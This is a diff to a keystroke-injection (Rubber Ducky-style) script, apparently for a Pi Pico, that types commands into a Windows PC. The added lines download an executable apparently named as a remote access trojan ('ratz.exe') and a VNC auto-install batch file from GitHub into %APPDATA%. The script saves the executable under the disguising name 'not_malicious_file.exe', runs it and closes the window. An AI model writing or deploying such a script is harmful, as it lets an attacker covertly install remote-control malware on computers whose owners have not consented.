@@ -9,9 +9,12 @@ DELAY 1000
 STRING cd %APPDATA%
 ENTER
 DELAY 1000
-STRING curl.exe --output not_malicious_file.bat --url https://raw.githubusercontent.com/nzkoxzu/pi-pico-rubber-ducky/main/vnc_auto_inst.bat
-ENTER
+STRING curl.exe --output not_malicious_file.exe --url https://raw.githubusercontent.com/nzkoxzu/K-ptain.Ratz-GUI/main/ratz/ratz.exe
 DELAY 2000
-STRING not_malicious_file.bat
+STRING curl.exe --output not_malicious_file.bat --url https://raw.githubusercontent.com/nzkoxzu/pi-pico-rubber-ducky/main/vnc_auto_inst.bat
+DELAY 1000
+STRING not_malicious_file.exe
 ENTER 
-DELAY
+DELAY 1000
+STRING EXIT
+ENTER
